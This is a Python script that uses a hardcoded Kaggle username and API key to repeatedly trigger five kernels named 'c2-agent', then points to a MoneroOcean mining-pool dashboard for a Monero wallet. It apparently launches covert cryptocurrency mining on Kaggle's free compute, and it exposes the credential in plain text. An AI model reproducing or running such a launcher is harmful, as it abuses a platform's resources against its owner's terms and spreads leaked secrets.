#!/usr/bin/env python3
"""Direct Kaggle API kernel runner."""
import requests, json, time, base64

USERNAME = "stephenhowell94611"
API_KEY = "9a5d3c51ece5433f3072809bc4765604"
BASE = "https://www.kaggle.com/api/v1"

auth = base64.b64encode(f"{USERNAME}:{API_KEY}".encode()).decode()
hdrs = {"Authorization": f"Basic {auth}", "Content-Type": "application/json"}

kernels = [f"{USERNAME}/c2-agent-{i}" for i in range(1, 6)]

print("Triggering kernels via API...\n")

for k in kernels:
    print(f"[API] {k}...", end=" ", flush=True)
    
    # Get kernel info
    try:
        r = requests.get(f"{BASE}/kernels/status/{k}", headers=hdrs, timeout=15)
        if r.status_code != 200:
            print(f"SKIP (status={r.status_code})")
            continue
        
        # Trigger new version (auto-runs)
        payload = {
            "id": k,
            "versionNotes": f"auto-run {int(time.time())}"
        }
        r2 = requests.post(f"{BASE}/kernels/version", headers=hdrs, json=payload, timeout=20)
        
        if r2.status_code in (200, 201):
            print("OK")
        else:
            print(f"FAIL ({r2.status_code})")
    except Exception as e:
        print(f"ERROR ({e})")
    
    time.sleep(2)

print("\nDone. Monitor: https://moneroocean.stream/#/dashboard?addr=44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5")
